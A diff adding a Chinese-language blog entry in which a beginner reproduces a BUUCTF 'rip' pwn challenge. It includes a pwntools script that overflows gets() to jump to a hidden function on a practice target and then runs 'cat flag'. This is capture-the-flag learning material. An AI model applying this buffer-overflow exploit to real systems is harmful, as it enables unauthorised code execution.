@@ -1,6 +1,50 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>尝试复现pwn入门题的wp</title>
+    <url>/2021/10/03/%E5%B0%9D%E8%AF%95%E5%A4%8D%E7%8E%B0pwn%E5%85%A5%E9%97%A8wp/</url>
+    <content><![CDATA[<p>很不了解，很想尝试，顺便借复现wp补充工具，于是试了一道题</p>
+<span id="more"></span> 
+
+<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><h3 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h3><p>给一个附件和一个靶机地址</p>
+<p><del>rip应该不至于是rest in peace吧</del></p>
+<p>用ida打开，</p>
+<p><img src="https://i.loli.net/2021/10/02/3Sdi9lHN7jnhy2q.png" alt="11.png"></p>
+<p>看到了gets()函数，很巧，我知道有个关于它的漏洞</p>
+<p><img src="https://i.loli.net/2021/10/02/UJeBrmaSkE6z9XK.png" alt="4.png"></p>
+<p>然后看看gets()的地址附近有没有什么东西</p>
+<p><img src="https://i.loli.net/2021/10/02/uPWkTcSzGqiQXY1.png" alt="55.png"></p>
+<p>有个奇怪的函数</p>
+<p>好了，不会了</p>
+<h3 id="二、看wp"><a href="#二、看wp" class="headerlink" title="二、看wp"></a>二、看wp</h3><p>思路确实是，利用gets()，把溢出的覆盖到所谓的后面函数。</p>
+<p>exp不会写，wp有</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27327</span>) //连接靶机地址</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">8</span>)+p64(<span class="number">0x401187</span>) //这里的f+<span class="number">8</span>可以靠工具计算，也可以直接数，但是我不熟</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="三、尝试复现"><a href="#三、尝试复现" class="headerlink" title="三、尝试复现"></a>三、尝试复现</h3><p>于是，又要在不同的报错中，配置虚拟机pwn环境</p>
+<p>该装上的都装上后，cd到脚本当前目录，运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 pwn2.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/02/Tf4YtvuNlJzjB5R.png" alt="D.png"></p>
+<p>好，果然又报错了，查如何解决</p>
+<p>使用p64()时在后面加上.decode(‘unicode_escape’)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(system).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>再次运行</p>
+<p><img src="https://i.loli.net/2021/10/02/Z3NOeQscWDpIECU.png" alt="25.png"></p>
+<p>接上了，但是wp结束了，不过下面的操作不用wp我应该也能做了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/02/8WbESJKUB9lICRm.png" alt="J.png"></p>
+<hr>
+<h2 id="心路历程"><a href="#心路历程" class="headerlink" title="心路历程"></a>心路历程</h2><p>中间有好多次想直接放弃了，毕竟要装的东西太多了，要了解的东西太多了，很多次我觉得，我遇到的问题可能会简单到不会有具体步骤，会一直卡着我，要不再看点基础吧，但是我也不知道为啥还是坚持硬复现完了。挺好。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>buu的一道纠结了很久的题</title>
     <url>/2021/09/30/buu%E7%9A%84%E4%B8%80%E9%81%93%E7%BA%A0%E7%BB%93%E4%BA%86%E5%BE%88%E4%B9%85%E7%9A%84%E9%A2%98/</url>
     <content><![CDATA[<p>一道题纠结了很久，但也没弄的非常明白，记录，希望以后可以变得更强</p>
